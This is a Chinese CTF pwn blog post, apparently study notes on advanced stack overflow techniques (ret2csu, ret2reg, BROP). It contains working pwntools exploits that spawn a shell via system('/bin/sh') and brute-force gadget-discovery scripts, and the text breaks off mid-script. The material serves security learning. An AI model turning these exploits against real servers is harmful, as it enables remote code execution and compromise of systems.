<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="栈溢出进阶"><meta name="keywords" content="Pwn"><meta name="author" content="Second_BC,undefined"><meta name="copyright" content="Second_BC"><title>栈溢出进阶【Second_BC の BloG】</title><link rel="stylesheet" href="/SecondBC/css/fan.css"><link rel="stylesheet" href="/SecondBC/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/SecondBC/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/SecondBC/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/SecondBC/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: ,
  valine: ,
}</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/SecondBC/atom.xml" title="Second_BC の BloG" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2reg"><span class="toc-number">2.</span> <span class="toc-text">ret2reg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BROP"><span class="toc-number">3.</span> <span class="toc-text">BROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">攻击条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.1.</span> <span class="toc-text">基本思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.</span> <span class="toc-text">实现攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%BA%A2%E5%87%BA"><span class="toc-number">3.3.1.</span> <span class="toc-text">测试溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEstop-gadget"><span class="toc-number">3.3.2.</span> <span class="toc-text">寻找stop gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%ABbrop-gadget"><span class="toc-number">3.3.3.</span> <span class="toc-text">识别brop gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9Aput-plt%E5%9C%B0%E5%9D%80"><span class="toc-number">3.3.4.</span> <span class="toc-text">确定put plt地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2put-got%E5%9C%B0%E5%9D%80"><span class="toc-number">3.3.5.</span> <span class="toc-text">泄露put got地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E7%9A%84EXP"><span class="toc-number">3.3.6.</span> <span class="toc-text">最终的EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Smash"><span class="toc-number">4.</span> <span class="toc-text">Stack Smash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SROP"><span class="toc-number">5.</span> <span class="toc-text">SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">5.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">5.2.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/SecondBC/ss.jpg"></div><div class="author-info-name">Second_BC</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/" target="_blank">GitHub<i class="icon-dot bg-color2"></i></a><a class="links-button button-hover" href="mailto:1" target="_blank">E-Mail<i class="icon-dot bg-color4"></i></a><a class="links-button button-hover" href="tencent://message/?uin=2&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color7"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/SecondBC/archives"><span class="pull-top">日志</span><span class="pull-bottom">39</span></a><a class="author-info-articles-tags article-meta" href="/SecondBC/tags"><span class="pull-top">标签</span><span class="pull-bottom">10</span></a><a class="author-info-articles-categories article-meta" href="/SecondBC/categories"><span class="pull-top">分类</span><span class="pull-bottom">3</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/SecondBC">首页</a><a class="menu-item" href="/SecondBC/archives">归档</a><a class="menu-item" href="/SecondBC/categories">分类</a><a class="menu-item" href="/SecondBC/tags">标签</a><a class="menu-item" href="/SecondBC/about">关于</a></nav><div class="right-info"><a class="title-name" href="/SecondBC/">Second_BC の BloG</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">栈溢出进阶</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2024-10-30 | 更新于 2024-10-30</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Pwn/">Pwn</a></div></div></div><div class="main-content"><p>所用题目可在<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/">中级ROP - CTF Wiki (ctf-wiki.org)</a>找到；</p>
<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>对于X64(amd64)程序，函数传参为rdi,rsi,rdx,rcx,r8,r9，然后是栈；</p>
<p>而x64程序中有这样一个系统自带函数 __libc_csu_init，这个函数是用来对 libc 进行初始化操作的；</p>
<p>这个函数里面有许多可以利用的gadget，可以控制一些寄存器，可以用一道题来进行演示（level5）；</p>
<p><img src="https://s2.loli.net/2024/10/16/tlnoiNr9MRgCDw7.png" alt="image.png"></p>
<p>分析后很简单的一个栈溢出，没了，什么都没有，只有一个我们上面提到的__libc_csu_init可以利用；</p>
<p><img src="https://s2.loli.net/2024/10/16/KzcUIf2aYsRPVpq.png" alt="image.png"></p>
<p>我也不知道为什么ida翻译过来的内容是这样的，而且这段代码还不能直接利用pop rdi ret（拆开pop r15机械码），很奇怪；</p>
<p>思路为：</p>
<ul>
<li>获取libc基址；</li>
<li>拿system地址；</li>
<li>拿binsh地址；</li>
<li>执行system（binsh）；</li>
</ul>
<p>编写exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write和read的libc函数地址对应指针(got表)</span></span><br><span class="line">write_addr = <span class="number">0x601000</span></span><br><span class="line">read_addr = <span class="number">0x601008</span></span><br><span class="line">main = <span class="number">0x400564</span></span><br><span class="line"><span class="comment">#__libc_csu_init中的利用</span></span><br><span class="line">pop_rbx_egg_gadget = <span class="number">0x400606</span></span><br><span class="line">dx_si_di_gadget = <span class="number">0x4005F0</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一步，获取libc基址</span></span><br><span class="line"><span class="comment">#执行write函数需要三个变量 rdi为1（写到标准输出）rsi为写入内容 rdx为长度 write(1,&quot;ddd&quot;,len);</span></span><br><span class="line"><span class="comment">#所以需要先控制这三个寄存器内容为1，和write_addr，以及8！</span></span><br><span class="line"><span class="comment">#                       返回到利用              未知偏移    rbx      rbp     r12              r13-edi   r14-rsi           r15-rdx  ret</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x88</span> + p64(pop_rbx_egg_gadget) +p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_addr) + p64(<span class="number">1</span>) + p64(write_addr) + p64(<span class="number">8</span>) + p64(dx_si_di_gadget)</span><br><span class="line"><span class="comment">#这个时候已经把我们想要的寄存器给改了，同时执行call [r12 + rbx*8]，执行write后，绕过rbp与rbx的判断，此时应该返回main</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(main)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#拿到libc基址 第一步完成</span></span><br><span class="line">write_in_libc = u64(p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)[:<span class="number">8</span>])</span><br><span class="line">libc.address = write_in_libc - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过libc拿system和binsh</span></span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh:&#x27;</span>,<span class="built_in">hex</span>(binsh),<span class="string">&#x27; system:&#x27;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二步，执行system</span></span><br><span class="line"><span class="comment">#因为只能控制edi，binsh的完整地址放不进去，可以先写到bss段，因为bss段长度没那么大，可以使用edi</span></span><br><span class="line"><span class="comment">#同时call [r12 + rbx*8] 需要的是函数指针，所以也可以把system地址写过去</span></span><br><span class="line">bss = <span class="number">0x0601028</span></span><br><span class="line"><span class="comment"># read(0,bss,16);</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x88</span> + p64(pop_rbx_egg_gadget) +p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_addr) + p64(<span class="number">0</span>) + p64(bss) + p64(<span class="number">16</span>) + p64(dx_si_di_gadget)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(p64(system) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时我们有了函数指针以及小地址的binsh字符串；</span></span><br><span class="line"><span class="comment">#利用call [r12 + rbx*8] 执行system(/bin/sh)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x88</span> + p64(pop_rbx_egg_gadget) +p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss) + p64(bss+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(dx_si_di_gadget)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>在wiki上，作者提到了对ret2csu的改进，思路是尽量不改变使用的寄存器的值且提前改变，进行多次利用，节省ROP空间；</p>
<h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
<li>查看溢出函数返回时哪个寄存值指向溢出缓冲区空间；</li>
<li>然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址（gadget利用）；</li>
<li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)；</li>
</ul>
<p>这里解释下JOP和COP的含义：jump oriented programming, call oriented programming;</p>
<p>在ret2csu中，我们最后利用的一次payload实际上就是COP，思路类似；</p>
<h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p>全名：blind return oriented programming；</p>
<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><ul>
<li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>
<li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
</ul>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>目前，大部分应用都会开启 ASLR、NX、Canary 保护；</p>
<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>在 BROP 中，基本的遵循的思路如下</p>
<ul>
<li>判断栈溢出长度<ul>
<li>暴力枚举</li>
</ul>
</li>
<li>Stack Reading<ul>
<li>获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。</li>
</ul>
</li>
<li>Blind ROP<ul>
<li>找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。</li>
</ul>
</li>
<li>Build the exploit<ul>
<li>利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。</li>
</ul>
</li>
</ul>
<p>由于程序崩溃会重新启动，且地址一样，cannary一样，所以可以通过溢出崩溃进行爆破；</p>
<p>而寻找gadget需要一些技巧：</p>
<ul>
<li>寻找 stop gadget：所谓<code>stop gadget</code>一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态（用于之后测试gadget地址）；当找到一段gadget之后，程序继续执行返回到这段连接状态地区时，程序一直连接，证明找到一段可用的gadget；</li>
<li>识别gadget：将可利用的gadget称之为probe等待测试，此外还需要找到stop（stop gadget地址）和trap（导致程序崩溃地址）；利用stop和trap的不同摆放栈上的位置可以探测出，probe里面的内容，比如：<ul>
<li>probe,trap,stop,traps：通过这个样子找到只是弹出一个栈变量的gadget（崩溃了就不是，没崩溃就说明找到了）；</li>
</ul>
</li>
</ul>
<p>相当于在识别gadget时，只需要确定stop之前有几个trap，就能知道pop了几次，同时如果要确认probe本身不是一个stop，则需要二次确认，在probe后方全部添加为trap，如果崩了，说明probe找对了，否则就被误导了；</p>
<p>在ret2csu的__libc_csu_init函数后面的那一串pop称之为brop gadget，因为它的特征很明显，一次性pop 6次，所以在找的时候尽量去找brop gadget，因为其他找到的gadget无法识别它到底pop的是哪个寄存器！通过brop gadget，可以控制rsi，edi；</p>
<p>寻找plt表利用函数：</p>
<p>为什么是找plt而不直接找got呢？因为plt在got内存之前，在很多段之前，从程序基址找起，第一次找到的就是它；</p>
<p>对于plt表，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表（使用了它的函数）；除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头；</p>
<p>关于plt表的格式问题公式化套路：最后一次调用函数成功的地址减6为真实plt表地址；</p>
<p>之后就会利用strcmp来控制rdx的值，进而使用打印函数；</p>
<p>判断strcmp的方法也简单：控制前两个参数为可读地址，它才能正确执行，否则崩溃；</p>
<p>之后就是寻找输出函数；</p>
<p>寻找put有一个公式：</p>
<p>其中addr为爆破地址；</p>
<p>如果能打印出elf，就说明找对了输出函数；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*length +p64(pop_rdi_ret)+p64(<span class="number">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure>



<h3 id="实现攻击"><a href="#实现攻击" class="headerlink" title="实现攻击"></a>实现攻击</h3><p>以一道题为例子： <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop">HCTF2016 的出题人失踪了</a></p>
<p>没有二进制文件，直接用脚本进行测试：</p>
<h4 id="测试溢出"><a href="#测试溢出" class="headerlink" title="测试溢出"></a>测试溢出</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testStack</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = testStack(<span class="string">b&#x27;a&#x27;</span>*i)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;this is length: &#x27;</span>,i,<span class="string">&#x27; .&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>当i = 73时，发生EOF报错，同时没有出现cannary报错，说明72之后为返回地址；</p>
<h4 id="寻找stop-gadget"><a href="#寻找stop-gadget" class="headerlink" title="寻找stop gadget"></a>寻找stop gadget</h4><p>此时开始寻找关键判断内容：stop gadget；</p>
<p>因为原程序本身就有一个等待输入的部分，所以可以思考能否返回到再次输入的部分呢？</p>
<p>这个样子就构成了stop gadget，同时也能再一次进行输入利用，相当于返回了一次main；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">overflowlen = <span class="number">72</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#从40W开始，400590,400591,400595,0x400596      linux会崩掉</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400597</span>,<span class="number">0xffffffffffffffff</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">        p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * overflowlen + p64(i)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        res = p.recv()</span><br><span class="line">        <span class="comment">#测试发现程序崩溃后不会打印之后的字符串</span></span><br><span class="line">        <span class="keyword">if</span> res == <span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;stop gadget: &#x27;</span>,<span class="built_in">hex</span>(i))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#stop gadget:  0x4005c0</span></span><br></pre></td></tr></table></figure>

<p>利用如上脚本得到一个stopgadget地址；</p>
<h4 id="识别brop-gadget"><a href="#识别brop-gadget" class="headerlink" title="识别brop gadget"></a>识别brop gadget</h4><p>利用之前的原理寻找连续6pop的的地方：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">overflowlen = <span class="number">72</span></span><br><span class="line">stop = <span class="number">0x4005c0</span></span><br><span class="line">trap = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#已经确认744之前无brop gadget 不是recv timeout就是linux崩</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40074a</span>,<span class="number">0xffffffffffffffff</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#都会导致linux崩溃</span></span><br><span class="line">        <span class="comment">#if i == 0x400590 or i == 0x400591 or i == 0x400595 or i == 0x400596 or i == 0x4005cc or i == 0x4005cb:</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0x4006f2</span> <span class="keyword">or</span> i == <span class="number">0x400700</span> <span class="keyword">or</span> i == <span class="number">0x400734</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">        p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * overflowlen + p64(i) + p64(trap) + p64(trap)+ p64(trap)+ p64(trap)+ p64(trap)+ p64(trap) + p64(stop) + p64(trap)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        res = p.recv(timeout = <span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> res == <span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>:</span><br><span class="line">            <span class="comment">#判断探针i是否本身就是一个stop</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">                p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">                payload = <span class="string">b&#x27;a&#x27;</span> * overflowlen + p64(i) + p64(trap) + p64(trap)+ p64(trap)+ p64(trap)+ p64(trap)+ p64(trap) + p64(trap) + p64(trap)</span><br><span class="line">                p.sendline(payload)</span><br><span class="line">                res = p.recv(timeout = <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;brop gadget: &#x27;</span>,<span class="built_in">hex</span>(i))</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#brop gadget:  0x4007ba</span></span><br></pre></td></tr></table></figure>

<p>可以找到brop gadget的地址；</p>
<p>同时这道题的csu pop是正常的，不是mov再给rsp减38h，是连着pop的，所以可以用pop rdi之前提及到的这种小技巧；</p>
<p>接下来就是找函数了；</p>
<h4 id="确定put-plt地址"><a href="#确定put-plt地址" class="headerlink" title="确定put plt地址"></a>确定put plt地址</h4><p><img src="https://s2.loli.net/2024/10/18/78DOvCbYI3AVpZy.png" alt="image"></p>
<p>上图是关于brop gadget的利用，直接通过brop gadget地址 + 9获取 pop rdi ret</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">overflowlen = <span class="number">72</span></span><br><span class="line">stop = <span class="number">0x4005c0</span></span><br><span class="line">trap = <span class="number">0x400000</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">pop_rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0xffffffffffffffff</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">    <span 